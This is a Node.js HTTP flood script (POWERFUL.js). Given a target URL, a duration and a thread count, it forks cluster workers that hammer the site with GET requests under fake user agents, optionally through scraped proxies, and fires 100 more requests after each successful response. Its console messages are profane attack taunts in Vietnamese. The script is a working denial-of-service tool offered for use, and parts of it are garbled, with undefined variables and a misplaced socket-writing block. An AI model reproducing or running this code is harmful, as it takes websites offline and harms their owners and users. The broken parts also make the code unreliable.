require('events').EventEmitter.defaultMaxListeners = 0;
const request = require('request')
      axios = require("axios"),
      fs = require('fs'),
      fakeUa = require('fake-useragent');
      cluster = require('cluster');
async function poptto() {
    if (process.argv.length !== 6) {
        console.log(`node POWERFUL.js url times threads proxy/off/proxy.txt`);
        console.log(`vi du : node POWERFUL.js https://dangtri.com 120 1000 dmtproxy.txt`);
        process.exit(0);
    }else{
        const target = process.argv[2];
        const times = process.argv[3];
        const threads = process.argv[4];
        Array.prototype.remove_by_value = function(val) {
            for (var i = 0; i < this.length; i++) {
            if (this[i] === val) {
                this.splice(i, 1);
                i--;
            }
            client.on('data', function () {
                setTimeout(function () {
                    client.destroy();
                    return delete client;
                }, 5000);
            });
            for (let i = 0; i < threads; ++i) {
                client.write(
                    `GET ${target} HTTP/2` +
                    headers
                )
            }
            }
            return this;
        }
        if (process.argv[5] == 'off') {
            console.log("ATTACK SENT ! DOWN CHẾT CON MẸ MÀY ĐI WEBSITE LỎ VCUT")
        } else if (process.argv[5] == 'proxy'){
            console.log("ATTACK SENT ! DOWN CHẾT CON MẸ MÀY ĐI WEBSITE LỎ VCUT")
            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
            var proxies = proxyscrape_http.data.replace(/\r/g, '').split('\n');
        } else {
            console.log("ATTACK SENT ! DMT-SCRIPT")
            var proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n');
        }
        function run() {
            if (process.argv[5] !== 'off') {
                var proxy = proxies[Math.floor(Math.random() * proxies.length)];
                var proxiedRequest = request.defaults({'ATTACK SENT ! DOWN CHẾT CON MẸ MÀY ĐI WEBSITE LỎ VCUT': 'http://'+proxy});
                var config = {
                    method: 'get',
                    url: target,
                    headers: {
                        'Cache-Control': 'no-cache',
                        'User-Agent': fakeUa()
                    }
                };
                proxiedRequest(config, function (error, response) {
                    console.log(response.statusCode, response.statusMessage, `${target}`);
                    if (proxies.length == 0) {
                        process.exit(0);
                    }
                    if (response.statusCode >= 200 && response.statusCode <= 226) {
                        for (let index = 0; index < 100; index++) {
                            proxiedRequest(config);
                        }
                    }else{
                        proxies = proxies.remove_by_value(proxy)
                    }
                });
            } else {
                var config = {
                    method: 'get',
                    url: target,
                    headers: {
                        'Cache-Control': 'no-cache',
                        'User-Agent': fakeUa()
                    }
                };
                request(config, function (error, response) {
                    console.log(response.statusCode, response.statusMessage, `${target}`);
                });
            }
        }
        function thread(){
            setInterval(() => {
                run();
            });
        }
        async function main(){
                if (cluster.isMaster) {
                        for (let i = 0; i < threads; i++) {
                            cluster.fork();
                        }
                    cluster.on('exit', function(){
                        cluster.fork();
                    });
                } else {
                    thread();
                }
        }
        main();
        setTimeout(() => {
            console.log('Attack ended.');
            process.exit(0)
        }, times * 1000);
    }
}
process.on('uncaughtException', function (err) {
});
process.on('unhandledRejection', function (err) {
});
poptto();
